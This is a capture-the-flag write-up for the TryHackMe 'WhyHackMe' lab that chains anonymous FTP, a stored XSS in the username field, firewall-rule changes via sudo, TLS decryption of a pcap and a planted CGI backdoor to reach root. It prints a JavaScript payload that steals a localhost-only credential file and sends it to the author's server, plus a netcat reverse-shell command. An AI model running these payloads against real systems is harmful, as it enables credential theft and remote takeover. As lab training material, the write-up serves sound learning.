---
title: 'WhyHackMe - TryHackMe'
author: Dark_side.84
categories: [TryHackMe]
tags: [ftp, web, xss, sudo, iptables, firewall, pcap, tls, cgi-bin]
render_with_liquid: false
image: /images/tryhackme_whyhackme/room_image.webp
---

WhyHackMe - TryHackMe

WhyHackMe exposes an FTP service that allows anonymous access. Inside the FTP server, we find a note pointing to a web endpoint that stores user credentials, but this endpoint can only be accessed locally. By abusing an XSS vulnerability on the web application, we can trick the admin into fetching those credentials for us, which allows us to log in via SSH. After that, we notice an HTTPS service running, but access to it is blocked by an iptables rule. Since we have sudo permissions, we modify the rule to allow incoming connections. Once the HTTPS server is reachable, we analyze a packet capture file we found and decrypt the TLS traffic using the server’s certificate key. This reveals the required endpoint and parameters that allow command execution, which we use to gain a shell as www-data. Finally, we escalate our privileges using sudo and obtain a root shell.

![Tryhackme Room Link](/images/tryhackme_whyhackme/room_image.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/whyhackme>_

## Reconnaissance & Enumeration

### Full Port Scan (Nmap)

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.49.159.52
Nmap scan report for 10.49.159.52
Host is up (0.089s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
21/tcp    open     ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.169.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
41312/tcp filtered unknown
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The Nmap scan reveals three accessible services:
- 21/FTP
- 22/SSH
- 80/HTTP

Additionally, port 41321 appears to be filtered, which becomes important later in the attack chain.

### FTP Enumeration

The scan already shows that the FTP service allows **anonymous authentication**. After logging in, only a single file is present: `update.txt`.


```console
$ ftp 10.49.159.52 
Connected to 10.49.159.52.
220 (vsFTPd 3.0.3)
Name (10.49.159.52:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26486|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
```
Contents of the file:

```
Hey I just removed the old user mike because that account was compromised and for any
of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry
this file is only accessible by localhost(127.0.0.1), so nobody else can view it except
me or people with access to the common account. 
- admin
```
{: file="update.txt" }

From this note, we learn about a **sensitive web endpoint** located at `/dir/pass.txt` that contains **user credentials**. However, the admin clearly states that access to this file is **restricted to localhost only**, meaning it cannot be reached directly from our machine.

### Web Enumeration

Visiting the web application, several endpoints are immediately visible:

- /login.php
- /blog.php
- /index.php

Trying to access `http://10.49.159.52/dir/pass.txt` directly returns a `403 Forbidden` response, confirming that the endpoint is protected.

On `/blog.php`, there is an existing comment left by the admin user:

>Name: admin \
>Comment: Hey people, I will be monitoring your comments so please be safe and civil.

From this comment, it is clear that **admin actively reviews user-submitted content**, which immediately makes **XSS** a potential attack vector. However, commenting is restricted to authenticated users only.

> To comment you need to be logged in. To login please visit this link.

To uncover additional endpoints, **Directory Brute-Forcing** is performed.

```console
$ gobuster dir -u 'http://10.49.159.52/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php
...
/index.php            (Status: 200) [Size: 563]
/blog.php             (Status: 200) [Size: 3102]
/login.php            (Status: 200) [Size: 523]
/register.php         (Status: 200) [Size: 643]
/dir                  (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.49.159.52/assets/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
...
```

## Foothold — User Access as `jack`

### Discovering Stored XSS

Using the `/register.php` endpoint discovered earlier, I registered a new user account.

![Registering an account](/images/tryhackme_whyhackme/web_register.webp){: width="600" height="280" }

After logging in, the application allows authenticated users to leave comments on blog posts.

![Comment form](/images/tryhackme_whyhackme/web_comment_form.webp){: width="600" height="300" }

I first tested a basic XSS payload inside the comment field. The application HTML-encodes special characters, preventing script execution.

![Comment form](/images/tryhackme_whyhackme/web_xss_comment.webp){: width="450" height="100" }

>Name: darkside; \
>Comment: &amp;lt;script&amp;gt;alert(&amp;quot;Test&amp;quot;)&amp;lt;/script&amp;gt;

However, the comment field is not the only user-controlled input. The **username** is also reflected in the page and is not properly sanitized.

I registered another account with the following payload as the username: `<script>alert("Test")</script>`

After leaving a comment with this account, the payload executed successfully, confirming a **stored XSS vulnerability via the username field**.

![XSS Alert Payload](/images/tryhackme_whyhackme/web_xss_proof.webp){: width="550" height="350" }

### Using XSS to Get Credentials

To exploit this vulnerability, another account was registered with an external JavaScript payload as the username: `<script src="http://192.168.169.130/xss.js"></script>`

A Python HTTP server was started to host the malicious script.

```console
$ python3 -m http.server 80
```

After posting a comment using this account, a request for `xss.js` was received from my own browser. Shortly after, another request arrived from the admin user, confirming that the admin viewed the comment.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.169.130 - - [06/Jan/2024 03:51:01] code 404, message File not found
192.168.169.130 - - [06/Jan/2024 03:51:01] "GET /xss.js HTTP/1.1" 404 -
10.49.159.52 - - [06/Jan/2024 03:51:17] code 404, message File not found
10.49.159.52 - - [06/Jan/2024 03:51:17] "GET /xss.js HTTP/1.1" 404 -
```

A malicious `xss.js` file was created to request the locally restricted endpoint
`http://127.0.0.1/dir/pass.txt` and send its contents back to my server.
```javascript
var target_url = "http://127.0.0.1/dir/pass.txt";
var my_server = "http://192.168.169.130/data";
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch(my_server + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', target_url, true);
xhr.send(null);
```
{: file="xss.js" }

Once the admin loads the page containing the injected script, the payload is executed in the admin’s browser context. When a request for `xss.js` is received on our Python HTTP server, this confirms that the script has been successfully loaded. At this point, the admin must refresh or open `http://127.0.0.1/dir/pass.txt` in a **new browser tab**, not the already opened blog page, in order for the script to fetch the credentials and send them back to our server.

```console
10.49.159.52 - - [06/Jan/2024 04:03:16] "GET /xss.js HTTP/1.1" 200 -
10.49.159.52 - - [06/Jan/2024 04:03:17] code 404, message File not found
10.49.159.52 - - [06/Jan/2024 04:03:17] "GET /data?amFjazpXa...wo= HTTP/1.1" 404 -
```
Decoding the Base64-encoded response reveals valid credentials for the `jack` user.

```console
$ echo amFjazpXa...wo= | base64 -d
jack:[REDACTED]
```

### Shell as `jack`

Using the credentials obtained earlier, I authenticate to the target system via SSH and gain a shell as the `jack` user.

```console
ssh jack@10.49.159.52
```

Once logged in, I verify the user context and read the **user flag**.

```console
jack@ubuntu:~$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
jack@ubuntu:~$ cat user.txt 
[REDACTED]
```

## Shell as `www-data`

### File System Enumeration

While enumerating the system, two interesting files are discovered in the `/opt` directory:

- `urgent.txt`
- `capture.pcap`

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when
I try to remove them, they wont, even though I am root. Please go through the pcap 
file in /opt and help me fix the server. And I temporarily blocked the attackers
access to the backdoor by using iptables rules. The cleanup of the server is still
incomplete I need to start by deleting these files first.
```
{: file="urgent.txt" }

From this message, it is clear that attackers planted a **backdoor inside `/usr/lib/cgi-bin/`** and that access to it was **blocked using iptables rules**. The note also points us to a packet capture file for further investigation.

I download the `capture.pcap` file by starting a temporary Python HTTP server on the target machine, allowing me to access the file directly from my browser by visiting `http://10.49.159.52:8000`. After downloading the file, I open it in Wireshark for analysis. The captured traffic appears to be **TLS‑encrypted HTTP**, and during inspection, a hostname named `boring.box` is identified within the packets.

Example:

![PCAP FILE ACCESS](/images/tryhackme_whyhackme/pcap_file_share.webp){: width="550" height="350" }

### Identifying the Backdoored Web Server

---
Reviewing the Apache configuration files reveals a web server listening on a non-standard port, which matches the traffic seen in the packet capture.

```
...
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```
This configuration confirms that the backdoored service is running over **HTTPS on port 41312** and executes files directly from `/usr/lib/cgi-bin/`.

{: file="/etc/apache2/sites-enabled/000-default.conf" }

### Listening Services

Checking active listening ports confirms that the suspicious service is bound to `0.0.0.0:41312`, making it accessible externally once firewall rules are bypassed.

```console
jack@ubuntu:~$ ss -tln
State         Recv-Q        Send-Q                 Local Address:Port                  Peer Address:Port        Process        
LISTEN        0             511                          0.0.0.0:41312                      0.0.0.0:*                          
LISTEN        0             80                         127.0.0.1:3306                       0.0.0.0:*                          
LISTEN        0             511                          0.0.0.0:80                         0.0.0.0:*                          
LISTEN        0             32                           0.0.0.0:21                         0.0.0.0:*                          
LISTEN        0             4096                   127.0.0.53%lo:53                         0.0.0.0:*                          
LISTEN        0             128                          0.0.0.0:22                         0.0.0.0:* 
```

### Sudo privileges

The `jack` user is allowed to execute `iptables` as root using `sudo`, which is a critical privilege escalation vector.

```console
jack@ubuntu:~$ sudo -l
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

### Inspecting iptables Rules

To understand what is being restricted, I list the current iptables rules along with their line numbers.

```console
jack@ubuntu:~$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere            
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     all  --  anywhere             anywhere 
```

### Modifying the Firewall Rule

Since `jack` can run `iptables` as root, I replace the DROP rule with an ACCEPT rule to allow incoming connections on port `41312`.

```
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
```

Replacing it to be able to access it.

```console
jack@ubuntu:~$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
jack@ubuntu:~$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination         
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
...
```

At this point, the HTTPS service becomes accessible at `https://10.49.159.52:41312/`, and its TLS certificate uses the same hostname that was previously observed in the packet capture, confirming that this is the same backdoored service.


### Decrypting the TLS Traffic

From the Apache configuration, it is known that the HTTPS service uses the following private key:

```
...
SSLCertificateKeyFile /etc/apache2/certs/apache.key
...
```
{: file="/etc/apache2/sites-enabled/000-default.conf" }

The `jack` user has read access to this key, so I download it and import it into `Wireshark` under:
 `Edit->Preferences->Protocols->TLS`.

![Importing key to Wireshark](/images/tryhackme_whyhackme/wireshark_importing_key.webp){: width="700" height="500" }

After importing the key, the previously encrypted traffic is successfully decrypted. The decrypted packets reveal that attackers were executing commands through the following endpoint:
`/cgi-bin/5UP3r53Cr37.py`.

![Attacker's request](/images/tryhackme_whyhackme/wireshark_attacker_request.webp){: width="700" height="450" }

### Achieving RCE as `www-data`

By replicating the attacker’s request, it is possible to execute arbitrary commands on the system.

```console
$ curl -k -s 'https://10.49.159.52:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'

<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>
```

Getting a Reverse Shell

First, I start a netcat listener on my machine.

```console
$ nc -lvnp 443
```

Then, I send a reverse shell payload through the vulnerable endpoint.

```console
$ curl -k -s 'https://10.49.159.52:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.169.130 443 >/tmp/f'
```

Once the connection is received, I stabilize the shell for better interaction.

### Stabilizing the shell.

```console
$ nc -lvnp 443        
listening on [any] 443 ...
connect to [192.168.169.130] from (UNKNOWN) [10.49.159.52] 54144
bash: cannot set terminal process group (879): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ python3 -c 'import pty;pty.spawn("/bin/bash");'
<in$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@ubuntu:/usr/lib/cgi-bin$ export TERM=xterm
export TERM=xterm
www-data@ubuntu:/usr/lib/cgi-bin$ ^Z
zsh: suspended  nc -lvnp 443
```

After spawning the shell, pressing `Ctrl+Z` may suspend or appear to kick you out of the shell — this is expected, so don’t panic. In the **same terminal on Kali Linux**, simply type `stty raw -echo; fg` to bring the shell back to the foreground. Once it resumes, press **Enter twice** to refresh the prompt and continue interacting with the shell normally.


```console
$ stty raw -echo; fg

[1]  + continued  nc -lvnp 443

www-data@ubuntu:/usr/lib/cgi-bin$ stty rows 26 cols 127
www-data@ubuntu:/usr/lib/cgi-bin$
```

## Shell as root

### Sudo privileges

With a stable shell as `www-data`, privilege escalation is trivial since the user has unrestricted `sudo` access. By switching to a root shell using `sudo`, full administrative control is obtained, allowing access to the root flag.


```console
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

Spawning a shell as root using `sudo` and reading the root flag.

```console
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su -
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cat root.txt
[REDACTED]
```

## Conclusion

At this stage, the system has been fully compromised. Through service enumeration, credential exposure, and chained misconfigurations, initial access was achieved and progressively escalated.

By abusing the backdoored HTTPS service and overly permissive `sudo` privileges, we moved from a low‑privileged user to `www-data`, and ultimately to `root`.

Both the **user flag** and the **root flag** have been successfully obtained.

End of machine.

